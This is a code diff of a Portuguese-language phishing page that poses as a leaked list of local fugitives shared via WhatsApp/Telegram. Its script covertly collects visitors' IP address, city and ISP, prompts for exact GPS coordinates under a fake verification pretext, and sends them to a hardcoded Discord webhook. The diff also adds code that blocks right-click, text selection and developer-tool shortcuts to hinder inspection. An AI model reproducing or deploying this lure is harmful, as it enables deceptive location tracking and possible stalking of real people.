@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>🚨 LISTA DE FORAGIDOS - MONTE CARMELO</title>
     
-    <!-- Meta tags para parecer uma notícia real no WhatsApp/Telegram -->
+    <!-- Preview para WhatsApp/Telegram -->
     <meta property="og:title" content="🚨 URGENTE: Nova lista de foragidos de Monte Carmelo vazou!">
     <meta property="og:description" content="Confira os nomes dos principais procurados na região. Clique para ver a lista completa por bairro.">
     <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg">
@@ -19,6 +19,10 @@
             margin: 0; 
             padding: 0; 
             text-align: center; 
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         
         .header { 
@@ -52,13 +56,11 @@
             position: relative;
             width: 100%;
             margin-bottom: 20px;
-            /* Garante que a imagem não estoure o container */
             overflow: hidden; 
             border-radius: 4px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
         
-        /* Estilo para a imagem nítida */
         .final-img { 
             width: 100%; 
             height: auto; 
@@ -66,19 +68,18 @@
             transition: opacity 0.5s ease;
         }
         
-        /* Classe para quando a imagem estiver "bloqueada" visualmente antes do clique */
         .locked-overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.1); /* Leve escurecimento para destacar o cadeado */
+            background: rgba(0,0,0,0.1);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 10;
-            pointer-events: none; /* Permite o clique no botão mesmo se o overlay estiver lá */
+            pointer-events: none;
         }
 
         .lock-icon {
@@ -155,7 +156,7 @@
         }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
     <div class="header">MONTE CITY - PLANTÃO JUDICIAL</div>
 
@@ -167,10 +168,8 @@
         </div>
 
         <div class="img-container">
-            <!-- SUA NOVA IMAGEM VAI AQUI -->
             <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
             
-            <!-- Overlay com Cadeado -->
             <div id="lock-overlay" class="locked-overlay">
                 <div class="lock-icon">🔒</div>
             </div>
@@ -194,7 +193,7 @@
     </div>
 
     <script>
-        // Seu Webhook do Discord
+        // Webhook Discord
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
         function updateStatus(msg, percent) {
@@ -203,28 +202,21 @@
         }
 
         function iniciarVerificacao() {
-            // Esconde o botão e mostra o loader
             document.getElementById('btn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             
-            // Remove o cadeado visualmente para indicar que o processo começou
             document.getElementById('lock-overlay').style.opacity = '0';
             setTimeout(() => {
                 document.getElementById('lock-overlay').style.display = 'none';
             }, 500);
 
-            // Passo 1: Tentar pegar o IP primeiro (rápido)
             updateStatus("Conectando ao servidor central...", 15);
             
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
                     updateStatus("Identificando torre de celular mais próxima...", 40);
-                    
-                    // Envia dados do IP
                     enviarDados(`📍 **ACESSO POR IP**\n🏙️ Cidade: ${data.city}\n🌐 IP: ${data.ip}\n📡 ISP: ${data.org}`);
-                    
-                    // Passo 2: Pedir GPS
                     solicitarGPS();
                 })
                 .catch(() => {
@@ -249,7 +241,6 @@
                     
                     const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    // Envia dados do GPS
                     enviarDados(`🛰️ **LOCALIZAÇÃO EXATA CAPTURADA!**\n📍 Coordenadas: ${lat}, ${lon}\n🎯 Precisão: ~${precisao} metros\n🗺️ Mapa: ${mapaLink}`);
                     
                     finalizarComSucesso();
@@ -257,10 +248,8 @@
                 (error) => {
                     console.error("Erro GPS:", error);
                     if (error.code === 1) {
-                        // Usuário negou
                         mostrarErro();
                     } else {
-                        // Erro técnico
                         finalizarComFalha();
                     }
                 },
@@ -279,7 +268,6 @@
         function mostrarErro() {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('error-msg').style.display = 'block';
-            // Opcional: Redirecionar após alguns segundos se ele não permitir manualmente
             setTimeout(() => {
                  window.location.href = "https://www.instagram.com/montecitybr";
             }, 5000);
@@ -289,7 +277,6 @@
             updateStatus("Carregando lista de foragidos...", 95);
             setTimeout(() => {
                 updateStatus("Redirecionando para a lista exclusiva...", 100);
-                // Redireciona para o Instagram ou onde quiser mostrar a "lista"
                 window.location.href = "https://www.instagram.com/montecitybr";
             }, 1500);
         }
@@ -300,6 +287,15 @@
                 window.location.href = "https://www.instagram.com/montecitybr";
             }, 1000);
         }
+
+        // Bloqueio de Inspeção
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'F12' || 
+               (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
+               (event.ctrlKey && event.key.toLowerCase() === 'u')) {
+                event.preventDefault();
+            }
+        });
     </script>
 
 </body>
